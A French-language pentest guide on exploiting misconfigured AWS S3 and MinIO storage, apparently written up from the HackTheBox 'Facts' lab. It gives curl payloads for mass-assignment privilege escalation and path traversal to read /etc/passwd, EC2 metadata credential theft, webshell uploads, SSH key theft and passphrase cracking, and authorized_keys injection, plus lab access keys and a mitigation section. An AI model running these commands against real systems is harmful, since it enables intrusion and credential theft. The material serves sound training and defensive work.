# AWS

## <mark style="color:$danger;">Exploitation AWS S3 et MinIO</mark>

### <mark style="color:blue;">Introduction</mark>

**Amazon S3 (Simple Storage Service)** est un service de stockage d'objets largement utilisé pour stocker et récupérer des données. **MinIO** est une alternative open-source compatible avec l'API S3. Les mauvaises configurations de ces services peuvent exposer des données sensibles, y compris des clés SSH, des credentials, et des fichiers de configuration.

***

### <mark style="color:blue;">Architecture AWS S3</mark>

#### Concepts de Base

**Bucket :** Conteneur de stockage (équivalent d'un dossier racine)

```
randomfacts/
├── images/
│   ├── logo.png
│   └── banner.jpg
├── documents/
│   └── report.pdf
└── config.json
```

**Objets :** Fichiers stockés dans un bucket (jusqu'à 5 TB par objet)

**Régions :** Localisation géographique du bucket (us-east-1, eu-west-1, etc.)

**Endpoints :** URL d'accès au service

* AWS S3 : `https://s3.amazonaws.com`
* MinIO : `http://localhost:9000` (par défaut)

#### <mark style="color:green;">Composants de Sécurité</mark>

**Access Keys**

```
AWS Access Key ID : AKIA733C4D49E27B7CD1
AWS Secret Access Key : ydS50x3FrC5fxymSomPchzK5EFEWfimSZoHE5oxd
```

**Format des Access Keys :**

* **Access Key ID** : Commence par `AKIA` (20 caractères alphanumériques)
* **Secret Access Key** : 40 caractères alphanumériques (gardée secrète)

**IAM Policies**

Les permissions sont définies via des politiques JSON :

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::randomfacts",
        "arn:aws:s3:::randomfacts/*"
      ]
    }
  ]
}
```

**Bucket Policies**

Contrôle d'accès au niveau du bucket :

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::randomfacts/public/*"
    }
  ]
}
```

***

### <mark style="color:blue;">Découverte et Énumération</mark>

#### Phase 1 : Identification du Service

**Scan de Ports**

```bash
# Scan complet des ports
sudo nmap -p- -vvv 10.129.23.243

# Scan de services sur ports identifiés
sudo nmap -sC -sV -p 22,80,54321 10.129.23.243
```

**Résultats typiques pour MinIO :**

```
PORT      STATE SERVICE VERSION
54321/tcp open  http    Golang net/http server
|_http-server-header: MinIO
|_http-title: Did not follow redirect to http://10.129.23.243:9001
```

**Indicateurs MinIO/S3**

**Headers HTTP :**

```http
Server: MinIO
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 18901CE643E51405
```

**Réponses XML S3 :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>InvalidRequest</Code>
  <Message>Invalid Request (invalid argument)</Message>
  <Resource>/</Resource>
  <RequestId>18901CE2B3938EB3</RequestId>
</Error>
```

#### Phase 2 : Récupération des Credentials

**Sources Communes**

1.  **Panels d'administration exposés**

    ```
    http://target.com/admin
    http://target.com/admin/settings
    http://target.com/config
    ```
2.  **Fichiers de configuration**

    ```bash
    # Via Path Traversal ou LFI
    /etc/environment
    /var/www/html/.env
    /opt/app/config/aws.yml
    ```
3.  **Métadonnées EC2** (si l'application tourne sur AWS)

    ```bash
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```
4.  **Code source GitHub**

    ```bash
    # Recherche dans les commits
    git log -p | grep -i "AKIA"

    # Recherche dans les fichiers
    grep -r "aws_access_key_id" .
    ```

**Exemple CamaleonCMS**

Après exploitation du Mass Assignment pour obtenir les privilèges admin :

```
Panneau Admin → Settings → AWS Configuration
├── AWS Access Key ID: AKIA733C4D49E27B7CD1
├── AWS Secret Access Key: ydS50x3FrC5fxymSomPchzK5EFEWfimSZoHE5oxd
├── Bucket Name: randomfacts
├── Region: us-east-1
└── Endpoint: http://localhost:54321
```

***

### <mark style="color:blue;">Configuration AWS CLI</mark>

#### Installation

```bash
# Debian/Ubuntu
sudo apt update
sudo apt install awscli

# macOS
brew install awscli

# Python pip
pip install awscli --break-system-packages

# Vérification
aws --version
# aws-cli/1.44.29 Python/3.13.7
```

#### Configuration du Profil

```bash
# Configuration interactive
aws configure --profile htb

# Entrées requises :
# AWS Access Key ID: AKIA733C4D49E27B7CD1
# AWS Secret Access Key: ydS50x3FrC5fxymSomPchzK5EFEWfimSZoHE5oxd
# Default region name: us-east-1
# Default output format: json
```

**Fichier de configuration généré :**

`~/.aws/credentials`

```ini
[htb]
aws_access_key_id = AKIA733C4D49E27B7CD1
aws_secret_access_key = ydS50x3FrC5fxymSomPchzK5EFEWfimSZoHE5oxd
```

`~/.aws/config`

```ini
[profile htb]
region = us-east-1
output = json
```

#### Configuration Manuelle

```bash
# Créer les fichiers manuellement
mkdir -p ~/.aws

cat > ~/.aws/credentials << EOF
[htb]
aws_access_key_id = AKIA733C4D49E27B7CD1
aws_secret_access_key = ydS50x3FrC5fxymSomPchzK5EFEWfimSZoHE5oxd
EOF

cat > ~/.aws/config << EOF
[profile htb]
region = us-east-1
output = json
EOF
```

***

### <mark style="color:blue;">Exploitation S3/MinIO</mark>

#### <mark style="color:green;">Commandes de Base</mark>

**Lister les Buckets**

```bash
# AWS S3 standard
aws --profile htb s3 ls

# MinIO avec endpoint personnalisé
aws --profile htb \
  --endpoint-url http://target.com:54321 \
  s3 ls
```

**Résultat :**

```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

**Lister le Contenu d'un Bucket**

```bash
# Racine du bucket
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 ls s3://internal

# Dossier spécifique
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 ls s3://internal/.ssh/
```

**Résultat :**

```
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-02-02 04:41:36        464 id_ed25519
2026-02-02 04:41:36         82 authorized_keys
```

**Télécharger des Fichiers**

```bash
# Fichier unique
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 cp s3://internal/.ssh/id_ed25519 .

# Dossier complet (récursif)
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 cp s3://internal/.ssh/ ./ssh-keys/ --recursive

# Bucket entier
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 sync s3://internal ./internal-backup/
```

**Uploader des Fichiers**

```bash
# Fichier unique
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 cp shell.php s3://randomfacts/uploads/

# Dossier complet
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 cp ./webshell/ s3://randomfacts/public/ --recursive
```

#### Exploration Systématique

**Script d'Énumération**

```bash
#!/bin/bash

PROFILE="htb"
ENDPOINT="http://facts.htb:54321"

echo "[+] Listing all buckets..."
BUCKETS=$(aws --profile $PROFILE --endpoint-url $ENDPOINT s3 ls | awk '{print $3}')

for bucket in $BUCKETS; do
    echo "[+] Exploring bucket: $bucket"
    
    # Lister le contenu
    aws --profile $PROFILE --endpoint-url $ENDPOINT s3 ls s3://$bucket --recursive > "${bucket}_files.txt"
    
    # Rechercher des fichiers sensibles
    echo "[+] Searching for sensitive files in $bucket..."
    grep -E "\.(key|pem|ppk|ssh|env|config|yml|yaml|json|xml|sql|db|bak)$" "${bucket}_files.txt"
done
```

**Fichiers Sensibles à Rechercher**

**Credentials et clés :**

```bash
# Clés SSH
*.pem
*.ppk
id_rsa
id_ed25519
authorized_keys

# Fichiers de configuration
.env
.aws/credentials
config.json
database.yml
settings.xml
```

**Sauvegardes et dumps :**

```bash
# Bases de données
*.sql
*.db
*.sqlite
backup.tar.gz
dump.sql

# Archives
*.bak
*.old
*.backup
*.zip
```

**Code source :**

```bash
# Fichiers de projet
.git/
.svn/
composer.json
package.json
requirements.txt
```

#### <mark style="color:green;">Techniques Avancées</mark>

**Bypass de Restrictions**

**1. Utiliser différents endpoints :**

```bash
# Endpoint principal
--endpoint-url http://target.com:54321

# Endpoint de console
--endpoint-url http://target.com:9001

# IP directe
--endpoint-url http://10.129.23.243:54321
```

**2. Tester différentes régions :**

```bash
for region in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
    aws --profile htb --region $region s3 ls
done
```

**3. Accès anonyme :**

```bash
# Sans credentials (bucket public)
aws s3 ls s3://public-bucket --no-sign-request

# Télécharger sans authentification
aws s3 cp s3://public-bucket/file.txt . --no-sign-request
```

**Exploitation de Permissions**

**Tester les permissions :**

```bash
# Lecture
aws s3 ls s3://bucket/

# Écriture
echo "test" > test.txt
aws s3 cp test.txt s3://bucket/

# Suppression
aws s3 rm s3://bucket/test.txt

# Liste ACL
aws s3api get-bucket-acl --bucket bucket
```

**Permission Escalation :**

Si vous pouvez écrire dans `s3://bucket/.ssh/authorized_keys` :

```bash
# Ajouter votre clé publique
cat ~/.ssh/id_rsa.pub | aws s3 cp - s3://internal/.ssh/authorized_keys
```

***

### <mark style="color:blue;">Cas Pratique : HackTheBox "Facts"</mark>

#### Scénario d'Exploitation

**1. Reconnaissance initiale**

```bash
# Scan de ports
nmap -p- 10.129.23.243
# Découverte : Port 54321 (MinIO)

# Identification du service
nmap -sV -p 54321 10.129.23.243
# Résultat : MinIO server
```

**2. Compromission initiale**

```bash
# Exploitation Mass Assignment sur CamaleonCMS
curl -X POST http://facts.htb/admin/users/updated_ajax \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "5",
    "password": {
      "current_password": "oldpass",
      "new_password": "newpass123",
      "password_confirmation": "newpass123",
      "role": "admin"
    }
  }'
```

**3. Récupération des credentials AWS**

```
Accès admin → Settings → AWS Configuration
Access Key : AKIA733C4D49E27B7CD1
Secret Key : ydS50x3FrC5fxymSomPchzK5EFEWfimSZoHE5oxd
```

**4. Configuration AWS CLI**

```bash
aws configure --profile htb
# Entrer les credentials récupérés
```

**5. Énumération des buckets**

```bash
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 ls

# Résultat :
# 2025-09-11 08:06:52 internal
# 2025-09-11 08:06:52 randomfacts
```

**6. Exploration du bucket "internal"**

```bash
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 ls s3://internal --recursive

# Découverte :
# .ssh/id_ed25519
# .ssh/authorized_keys
```

**7. Exfiltration de la clé SSH**

```bash
aws --profile htb \
  --endpoint-url http://facts.htb:54321 \
  s3 cp s3://internal/.ssh/id_ed25519 .

# Permissions
chmod 600 id_ed25519
```

**8. Crack de la passphrase**

```bash
# Conversion pour John
ssh2john id_ed25519 > ssh.hash

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# Résultat : dragonballz
```

**9. Identification de l'utilisateur**

Via Path Traversal CVE sur CamaleonCMS :

```bash
# Récupération de /etc/passwd
curl "http://facts.htb/admin/media/download?file=../../../../etc/passwd"

# Extraction des utilisateurs avec shell
grep -E "/bin/bash$" passwd
# Résultat : trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
```

**10. Connexion SSH**

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz

# ✅ Accès obtenu !
```

***

### <mark style="color:blue;">Protection et Mitigation</mark>

#### <mark style="color:green;">Sécurisation des Buckets S3</mark>

**1. Bloquer l'Accès Public**

```bash
# Désactiver l'accès public
aws s3api put-public-access-block \
  --bucket my-bucket \
  --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

**2. Chiffrement au Repos**

```bash
# Activer le chiffrement SSE-S3
aws s3api put-bucket-encryption \
  --bucket my-bucket \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }]
  }'
```

**3. Versioning et Logging**

```bash
# Activer le versioning
aws s3api put-bucket-versioning \
  --bucket my-bucket \
  --versioning-configuration Status=Enabled

# Activer le logging
aws s3api put-bucket-logging \
  --bucket my-bucket \
  --bucket-logging-status '{
    "LoggingEnabled": {
      "TargetBucket": "logs-bucket",
      "TargetPrefix": "s3-access-logs/"
    }
  }'
```

**4. Politique d'Accès Stricte**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyInsecureTransport",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    },
    {
      "Sid": "AllowOnlyFromVPC",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpc": "vpc-12345678"
        }
      }
    }
  ]
}
```

#### <mark style="color:green;">Gestion des Credentials</mark>

**1. Rotation des Clés**

```bash
# Créer une nouvelle clé
aws iam create-access-key --user-name myuser

# Désactiver l'ancienne clé
aws iam update-access-key \
  --access-key-id AKIAIOSFODNN7EXAMPLE \
  --status Inactive \
  --user-name myuser

# Supprimer l'ancienne clé
aws iam delete-access-key \
  --access-key-id AKIAIOSFODNN7EXAMPLE \
  --user-name myuser
```

**2. Utiliser IAM Roles (recommandé)**

```bash
# Au lieu de hardcoder les credentials
# Utiliser des rôles IAM pour EC2, Lambda, etc.

# L'application récupère automatiquement les credentials
aws s3 ls  # Pas besoin de --profile
```

**3. Secrets Manager**

```bash
# Stocker les credentials dans AWS Secrets Manager
aws secretsmanager create-secret \
  --name prod/db/password \
  --secret-string "MySecretPassword123"

# Récupérer le secret dans l'application
aws secretsmanager get-secret-value \
  --secret-id prod/db/password \
  --query SecretString \
  --output text
```

#### <mark style="color:green;">Monitoring et Alertes</mark>

**CloudTrail**

```bash
# Activer CloudTrail pour l'audit
aws cloudtrail create-trail \
  --name my-trail \
  --s3-bucket-name my-cloudtrail-bucket

# Démarrer le logging
aws cloudtrail start-logging --name my-trail
```

**GuardDuty**

```bash
# Activer GuardDuty pour la détection de menaces
aws guardduty create-detector --enable
```

**Alertes SNS**

```bash
# Créer une alerte pour les téléchargements suspects
aws sns create-topic --name s3-download-alerts

aws s3api put-bucket-notification-configuration \
  --bucket my-bucket \
  --notification-configuration '{
    "TopicConfigurations": [{
      "TopicArn": "arn:aws:sns:us-east-1:123456789012:s3-download-alerts",
      "Events": ["s3:ObjectCreated:*", "s3:ObjectRemoved:*"]
    }]
  }'
```

***

### <mark style="color:blue;">Outils de Reconnaissance</mark>

#### S3Scanner

```bash
# Installation
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip3 install -r requirements.txt

# Scan de buckets
python3 s3scanner.py --bucket my-bucket
python3 s3scanner.py --bucket-file buckets.txt
```

#### CloudBrute

```bash
# Installation
go install github.com/0xsha/CloudBrute@latest

# Énumération de buckets
CloudBrute -d target.com -k keyword -m storage -o results.txt
```

#### Bucket Stream

```bash
# Installation
pip install bucket-stream

# Monitoring en temps réel
bucket-stream --only-interesting
```
